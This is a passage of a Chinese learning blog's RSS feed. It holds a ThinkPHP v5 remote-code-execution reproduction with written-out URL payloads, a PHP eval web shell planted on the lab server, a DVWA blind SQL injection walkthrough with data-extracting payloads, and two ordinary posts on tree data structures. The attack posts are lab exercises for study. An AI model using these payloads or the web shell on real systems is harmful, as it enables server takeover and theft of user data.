      <description>&lt;p&gt; 基于对RCE的学习，对著名的thinkphpv5进行漏洞复现&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p> 基于对RCE的学习，对著名的thinkphpv5进行漏洞复现</p><span id="more"></span><h2 id="搭建ThinkPHP-V5框架"><a href="#搭建ThinkPHP-V5框架" class="headerlink" title="搭建ThinkPHP V5框架"></a>搭建ThinkPHP V5框架</h2><p>首先搭建ThinkPHP V5框架，搭建过程可以参考<a href="https://blog.csdn.net/Jack_num1/article/details/105918659">thinkphp5环境搭建</a><br><img src="/2022/08/18/thinkphp5/11.png" style="zoom:50%;"><img src="/2022/08/18/thinkphp5/2.png" style="zoom:50%;"><br>在这个页面中可以看到并没有靶场给的那么明显的输入框，那么唯一的输入框就是ip地址的输入框</p><h2 id="初步尝试"><a href="#初步尝试" class="headerlink" title="初步尝试"></a>初步尝试</h2><p>进行注入尝试<br>输入：localhost&#x2F;tp5&#x2F;public&#x2F;index.php？s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1] []&#x3D;whoami<br>即在原地址后插入了从？s到whoami的命令。因为该框架是基于php语言构建所以可以执行linux命令<br>输出：<img src="/2022/08/18/thinkphp5/3.png" style="zoom:80%;"></p><h2 id="写入木马"><a href="#写入木马" class="headerlink" title="写入木马"></a>写入木马</h2><p>可以看到是存在命令执行漏洞的，尝试写入shell（后门木马）<br>输入：<img src="/2022/08/18/thinkphp5/4.png"><br>可以在thinkphpv5安装的地址中找到shell.php文件，推荐进行这步关闭防火墙，因为即便shell.php文件是空的，系统仍会警告然后删掉<br>输出：</p><img src="/2022/08/18/thinkphp5/5.png" style="zoom:67%;"><p><strong>注意:需要对特殊字符使用^转义(cmd环境下转义方式),windows环境的echo命令输出字符串到文档不<br>用引号(单引号、双引号),部分字符url编码不编码都行。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell.php文件内容为&lt;?php @eval($_POST[cmd];?)</span><br></pre></td></tr></table></figure><h2 id="夺旗"><a href="#夺旗" class="headerlink" title="夺旗"></a>夺旗</h2><p>(1)输入：localhost&#x2F;tp5&#x2F;public&#x2F;index.php?<br>s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1] []&#x3D;ls &#x2F;<br>输出：<img src="/2022/08/18/thinkphp5/6.png" style="zoom:80%;"></p><p>(2)输入：localhost&#x2F;tp5&#x2F;public&#x2F;index.php?<br>s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1] []&#x3D;ls &#x2F;flag<br>输出：<img src="/2022/08/18/thinkphp5/7.png" style="zoom:80%;"></p><p>(3)输入：localhost&#x2F;tp5&#x2F;public&#x2F;index.php?<br>s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1] []&#x3D;cat &#x2F;flag<br>输出：<img src="/2022/08/18/thinkphp5/8.png" style="zoom:80%;"></p><h2 id="通过phpinfo函数查看phpinfo-信息"><a href="#通过phpinfo函数查看phpinfo-信息" class="headerlink" title="通过phpinfo函数查看phpinfo()信息"></a>通过phpinfo函数查看phpinfo()信息</h2><h3 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：<img src="/2022/08/18/thinkphp5/9.png"></h3><h3 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：<img src="/2022/08/18/thinkphp5/10.png" style="zoom:80%;"></h3><hr><p>相关源码部分正在学习，之后补上，可别忘了</p>]]></content:encoded>
      
      
      
      <category domain="http://example.com/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/">网络攻防</category>
      
      <category domain="http://example.com/tags/%E5%AE%9E%E4%BE%8B/">实例</category>
      
      <category domain="http://example.com/tags/PHP/">PHP</category>
      
      
      <comments>http://example.com/2022/08/18/thinkphp5/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>树的逻辑结构</title>
      <link>http://example.com/2022/08/18/%E6%A0%91%E7%9A%84%E9%80%BB%E8%BE%91%E7%BB%93%E6%9E%84/</link>
      <guid>http://example.com/2022/08/18/%E6%A0%91%E7%9A%84%E9%80%BB%E8%BE%91%E7%BB%93%E6%9E%84/</guid>
      <pubDate>Thu, 18 Aug 2022 09:00:05 GMT</pubDate>
      
      <description>&lt;p&gt;使用双亲表示法孩子表示法以及孩子兄弟表示法表示树的逻辑结构，以及森林和二叉树的转换。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p>使用双亲表示法孩子表示法以及孩子兄弟表示法表示树的逻辑结构，以及森林和二叉树的转换。</p><span id="more"></span><h2 id="树的逻辑结构"><a href="#树的逻辑结构" class="headerlink" title="树的逻辑结构"></a>树的逻辑结构</h2><h3 id="双亲表示法"><a href="#双亲表示法" class="headerlink" title="双亲表示法"></a>双亲表示法</h3><p><img src="/2022/08/18/%E6%A0%91%E7%9A%84%E9%80%BB%E8%BE%91%E7%BB%93%E6%9E%84/image-20220709211533787.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_TREE_SIZE 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="type">int</span> parent;</span><br><span class="line">&#125;PTNode;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    PTNode nodes[MAX_TREE_SIZE];</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">&#125;PTree;</span><br></pre></td></tr></table></figure><h3 id="孩子表示法"><a href="#孩子表示法" class="headerlink" title="孩子表示法"></a>孩子表示法</h3><p><img src="/2022/08/18/%E6%A0%91%E7%9A%84%E9%80%BB%E8%BE%91%E7%BB%93%E6%9E%84/image-20220709212419211.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">CTNode</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> child;   <span class="comment">//孩子结点在数组中的位置</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">CTNode</span> *<span class="title">next</span>;</span>   <span class="comment">//下一个改组</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">CTNode</span> *<span class="title">fistchild</span>;</span> <span class="comment">//第一个孩子</span></span><br><span class="line">&#125; CTBox;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    CTBox nodes[MAX_TREE_SIZE];</span><br><span class="line">    <span class="type">int</span> n,r    <span class="comment">//结点数和根的位置</span></span><br><span class="line">&#125;CTree</span><br></pre></td></tr></table></figure><h3 id="孩子兄弟表示法"><a href="#孩子兄弟表示法" class="headerlink" title="孩子兄弟表示法"></a>孩子兄弟表示法</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CSNode</span>&#123;</span></span><br><span class="line">    ElemType data;   <span class="comment">//数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">CSNode</span> *<span class="title">firstchild</span>,*<span class="title">nextsibling</span>;</span>  <span class="comment">//第一个孩子和右兄弟指针</span></span><br><span class="line">&#125;CSNode,*CSTree</span><br></pre></td></tr></table></figure><h3 id="森林和二叉树的转换"><a href="#森林和二叉树的转换" class="headerlink" title="森林和二叉树的转换"></a>森林和二叉树的转换</h3><p><img src="/2022/08/18/%E6%A0%91%E7%9A%84%E9%80%BB%E8%BE%91%E7%BB%93%E6%9E%84/image-20220709213548106.png"><br><img src="/2022/08/18/%E6%A0%91%E7%9A%84%E9%80%BB%E8%BE%91%E7%BB%93%E6%9E%84/image-20220709213700619.png" alt="image-20220709213700619"></p>]]></content:encoded>
      
      
      
      <category domain="http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">数据结构</category>
      
      <category domain="http://example.com/tags/%E6%A0%91%E4%B8%8E%E4%BA%8C%E5%8F%89%E6%A0%91/">树与二叉树</category>
      
      
      <comments>http://example.com/2022/08/18/%E6%A0%91%E7%9A%84%E9%80%BB%E8%BE%91%E7%BB%93%E6%9E%84/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>线索二叉树</title>
      <link>http://example.com/2022/08/18/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/</link>
      <guid>http://example.com/2022/08/18/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/</guid>
      <pubDate>Thu, 18 Aug 2022 08:56:17 GMT</pubDate>
      
      <description>&lt;p&gt;构建线索二叉树以及通过先序中序后序遍历查找线索二叉树的前驱后继&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p>构建线索二叉树以及通过先序中序后序遍历查找线索二叉树的前驱后继</p><span id="more"></span><h2 id="线索二叉树"><a href="#线索二叉树" class="headerlink" title="线索二叉树"></a>线索二叉树</h2><p>普通二叉树不能从任意一个指定结点开始遍历<br><img src="/2022/08/18/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709200423798.png"></p><h3 id="线索二叉树-1"><a href="#线索二叉树-1" class="headerlink" title="线索二叉树"></a>线索二叉树</h3><p><img src="/2022/08/18/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709200709261.png"><br><img src="/2022/08/18/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709200930693.png"></p><h3 id="土办法找前驱"><a href="#土办法找前驱" class="headerlink" title="土办法找前驱"></a>土办法找前驱</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//辅助全局变量，用于查找结点p的前驱</span></span><br><span class="line">BiTNode *p;</span><br><span class="line">BiTNode *pre=null;</span><br><span class="line">BiTNode *final-null;</span><br><span class="line"></span><br><span class="line"><span class="comment">//中序遍历</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InOrder</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T!=null)&#123;</span><br><span class="line">        InOrder(T-&gt;lchild);</span><br><span class="line">        visit(T);</span><br><span class="line">        InOrder(T-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//访问结点q</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">visit</span><span class="params">(BiTNode *q)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(q==p)</span><br><span class="line">        final = pre;     <span class="comment">//找到p的前驱</span></span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        pre = q;       <span class="comment">//pre指向当前访问的结点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="中序线索化"><a href="#中序线索化" class="headerlink" title="中序线索化"></a>中序线索化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//全局变量pre，指向当前访问结点的前驱</span></span><br><span class="line">ThreadNode *pre=null;</span><br><span class="line"><span class="comment">//中序线索化二叉树T</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">CreateInThread</span><span class="params">(ThreadTree T)</span>&#123;</span><br><span class="line">    pre=null;</span><br><span class="line">    <span class="keyword">if</span>(T!=null)&#123;</span><br><span class="line">        InThread(T);</span><br><span class="line">        <span class="keyword">if</span>(pre-&gt;rchild==null)</span><br><span class="line">            pre-&gt;rtag=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//线索二叉树的结点</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ThreadNode</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ThreadNode</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span></span><br><span class="line">    <span class="type">int</span> ltag,rtag;</span><br><span class="line">&#125;ThreadNode,* ThreadTree;</span><br><span class="line"><span class="comment">//中序遍历二叉树，一边遍历一边线索化</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InThread</span><span class="params">(ThreadTree T)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T!=null)&#123;</span><br><span class="line">        InOrder(T-&gt;lchild);</span><br><span class="line">        visit(T);</span><br><span class="line">        InOrder(T-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">visit</span><span class="params">(ThreadNode *q)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(q-&gt;lchild==null)&#123;</span><br><span class="line">        q-&gt;lchild=pre;</span><br><span class="line">        q-&gt;ltag=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pre!=null&amp;&amp;pre-&gt;rchild==null)&#123;</span><br><span class="line">        pre-&gt;rchild=q;</span><br><span class="line">        pre-&gt;rtag=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    pre=q;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="先序线索化"><a href="#先序线索化" class="headerlink" title="先序线索化"></a>先序线索化</h3><p><img src="/2022/08/18/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709204642583.png"></p><h2 id="在线索二叉树中找前驱后继"><a href="#在线索二叉树中找前驱后继" class="headerlink" title="在线索二叉树中找前驱后继"></a>在线索二叉树中找前驱后继</h2><h3 id="中序后继"><a href="#中序后继" class="headerlink" title="中序后继"></a>中序后继</h3><p><img src="/2022/08/18/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709205639652.png"><br>该方法的时间复杂度是O（1)</p><h3 id="中序前驱"><a href="#中序前驱" class="headerlink" title="中序前驱"></a>中序前驱</h3><p><img src="/2022/08/18/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709205928279.png"></p><h3 id="先序前驱"><a href="#先序前驱" class="headerlink" title="先序前驱"></a>先序前驱</h3><p>二叉链表没办法找到先序前驱<br>将二叉链表转化为三叉链表<br><img src="/2022/08/18/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709210518474.png"></p><h3 id="后序前驱"><a href="#后序前驱" class="headerlink" title="后序前驱"></a>后序前驱</h3><p><img src="/2022/08/18/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709211254569.png"></p><h3 id="后序后继"><a href="#后序后继" class="headerlink" title="后序后继"></a>后序后继</h3><p>p.rtag&#x3D;&#x3D;0，则一定有右孩子，所以只能用土办法来找</p><p><img src="/2022/08/18/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709210913690.png"></p><p>p为根节点则没有后序后继</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="/2022/08/18/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709211007944.png"></p>]]></content:encoded>
      
      
      
      <category domain="http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">数据结构</category>
      
      <category domain="http://example.com/tags/%E6%A0%91%E4%B8%8E%E4%BA%8C%E5%8F%89%E6%A0%91/">树与二叉树</category>
      
      
      <comments>http://example.com/2022/08/18/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>SQL盲注</title>
      <link>http://example.com/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/</link>
      <guid>http://example.com/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/</guid>
      <pubDate>Thu, 18 Aug 2022 07:13:10 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;判断注入类型&quot;&gt;&lt;a href=&quot;#判断注入类型&quot; class=&quot;headerlink&quot; title=&quot;判断注入类型&quot;&gt;&lt;/a&gt;判断注入类型&lt;/h3&gt;&lt;p&gt;(1)首先判断时字符型还是数字型注入&lt;br&gt;&lt;img src=&quot;/2022/08/18/SQL%E7%9B%</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><p>(1)首先判断时字符型还是数字型注入<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818151435068.png"><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818151552860.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">分析：</span><br><span class="line">依次输入</span><br><span class="line">1                    回显：exists</span><br><span class="line">1 and 1=2            回显：exists</span><br><span class="line">and逻辑语句的会先结果都是存在的，没有起到应有的效果，说明不是整型注入，猜测是字符型注入</span><br></pre></td></tr></table></figure><p>(2)猜解字符型<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818151701973.png"><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818151816959.png"><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818151840594.png"><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818151903942.png"><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818151924099.png"><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818160837212.png"><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818160855152.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">分析：</span><br><span class="line">通过上面5个图找到了引号插入点后，依次输入</span><br><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;2                 回显：missing</span><br><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;2                  回显：exists</span><br><span class="line">and和or语句起到了效果，说明是字符型注入</span><br><span class="line">并且经过#和--的测试，注释符也没有被过滤</span><br></pre></td></tr></table></figure><h3 id="获取数据库"><a href="#获取数据库" class="headerlink" title="获取数据库"></a>获取数据库</h3><p>(1)数据库名长<br>语法：1’ and length(database())&#x3D;X#<img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818152204573.png"><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818152252961.png"><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818152306683.png"><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818152346187.png"><br>可以知道数据库名长为4位，然后就是最麻烦的地方猜名字，两种方法ascll二分法和burp爆破</p><h4 id="二分法"><a href="#二分法" class="headerlink" title="二分法"></a>二分法</h4><p>数字的ascll是从80-89，小写字母是从97-122，大写字母是从65-90</p><p><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818154128881.png"><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818154100025.png"><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818154232882.png"><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818154251514.png"><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818154320008.png"><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818154350179.png"><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818154414112.png"><br>参照ascll，100是d，因为在前面手工注入的时候已经知道名字是dvwa，后面只做验证不做二分法<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818154550635.png"><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818154702041.png"><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818154729876.png"><br>可以看到得到的ascll码为100，118，119，97，转义过来就是d,v,w,a</p><h4 id="爆破法"><a href="#爆破法" class="headerlink" title="爆破法"></a>爆破法</h4><p>第一步：抓包送去爆破<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818171940461.png"><br>第二步：更改攻击方式为：集束炸弹（cluster bomb)<br>将抓包中的判断语句&gt;97改为&#x3D;97，在burp中是16进制表示&gt;的16进制是%3E,&#x3D;的十六进制是%3D(很重要)，选定爆破范围：第一个轰炸点是sbustr(string,int a,int b)函数的int a位置，第二个位置是所猜测的ascll码位置<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818172343357.png"><br>第三步：设置攻击方式<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818172408780.png" style="zoom: 67%;"><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818172421304.png" style="zoom: 67%;"><br>如图所示，由上面的步骤知道数据库名共四个字符所以爆破点1的三个参数是1，4，1，爆破点2则是从ascll的0到127遍历，轰炸一边大概要半个小时左右这还是四个字节，所以这也体现出来了工具的重要性，推荐sqlmap，实例看sqlmap使用。配置好了就可以开始爆破了。<br>第四步：得到结果<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818172743154.png"><br>跑了半个小时终于跑出来了，选择length就可以很快找到，可以看到对应的四个字符的ascll分别是100,108,118,119,这与二分法得到的结果是一样的，后面需要猜名字的都可以像这样，但是生命苦短，我选sqlmap一把梭。</p><h3 id="判断表的数量"><a href="#判断表的数量" class="headerlink" title="判断表的数量"></a>判断表的数量</h3><p>语法：1’and (select count(*) from information_schema.tables where table_schema&#x3D;’dvwa’ limit 0,1)&#x3D;’X （此处不需要limit函数）<br>X为表的数量<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818161240201.png"><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818161312586.png"><br>说明数据库中有两个表</p><h3 id="判断表长"><a href="#判断表长" class="headerlink" title="判断表长"></a>判断表长</h3><p>语法：1’and length(substr((select table_name from information_schema.tables where table_schema&#x3D;’dvwa’ limit a,b),1))&gt;’X<br>a 为从第几行  b 为输出几行数据  limit函数详情见函数库 X为表名长<br>所以第一张表名长<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818164718463.png"><br>第二张表名长<img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818164812015.png"></p><h3 id="判断表名"><a href="#判断表名" class="headerlink" title="判断表名"></a>判断表名</h3><p>语法：1’and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;’dvwa’ limit 0,1),A,1))&gt;’X              A表示第A位，X表示第A位对应的ascll码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">依次输入</span><br><span class="line">1&#x27;and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27; limit 0,1),1,1))&gt;&#x27;97</span><br><span class="line">1&#x27;and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27; limit 0,1),1,1))&lt;&#x27;122</span><br><span class="line">1&#x27;and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27; limit 0,1),1,1))&lt;&#x27;109</span><br><span class="line">1&#x27;and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27; limit 0,1),1,1))&lt;&#x27;103</span><br><span class="line">1&#x27;and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27; limit 0,1),1,1))&lt;&#x27;105</span><br><span class="line">1&#x27;and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27; limit 0,1),1,1))=&#x27;103</span><br><span class="line">//利用ascii()和substr()以及limit得出：第一个表的第一个字符为g</span><br><span class="line"></span><br><span class="line">//综上所述，</span><br><span class="line">第一个表名为：guestbook</span><br><span class="line">第二个表名为：users</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>或者使用爆破</p><h3 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h3><p>语法：1’and (select count(*) from information_schema.columns where table_name&#x3D;’users’)&#x3D;’11<img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818165921936.png"><br>如图所示，dvwa的users表的字段数为：11</p><h3 id="判断字段名长"><a href="#判断字段名长" class="headerlink" title="判断字段名长"></a>判断字段名长</h3><p>1’and length(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),1))&#x3D;’7<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818170155864.png"><br>如图所示，条件为表名是users的从information_schema.columns表中查字段名的第一行的数据从第一位开始输出的长度是7，然后就是二分法或者爆破</p><h3 id="判断字段名"><a href="#判断字段名" class="headerlink" title="判断字段名"></a>判断字段名</h3><p>语法：1’and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),1,1))&#x3D;’117<img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818170438584.png"><br>如图所示，条件为表名是users的从information_schema.columns表中查字段名的第一行的数据的第一位的ascll是117也就是u，最后得到结果为user_id</p><h3 id="判断字段的字段值"><a href="#判断字段的字段值" class="headerlink" title="判断字段的字段值"></a>判断字段的字段值</h3><p>查询users字段的数据<br>语法：1’and (select count(*) from users)&#x3D;’X X为该字段内共X条数据<img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818170831417.png"><br>如图所示，users表中共5条数据</p><p>语法：1’and length(substr((select user from users limit 0,1),1))&#x3D;’X        X为第一个字段值长度，第二、三个字段值更换limit函数参数<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818171129966.png"><br>如图所示，users字段值中第一个字段值长度为5</p><p>语法：1’and ascii(substr((select user from users limit 0,1),1,1))&#x3D;’X X为第一个字段值第一个字符的ascll码<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818171222053.png"></p><p>注：password表中得到的是md5加密后的结果需要自行解密</p>]]></content:encoded>
      
      
      
      <category domain="http://example.com/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/">网络攻防</category>
      
      <category domain="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</category>
      
      
      <comments>http://example.com/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
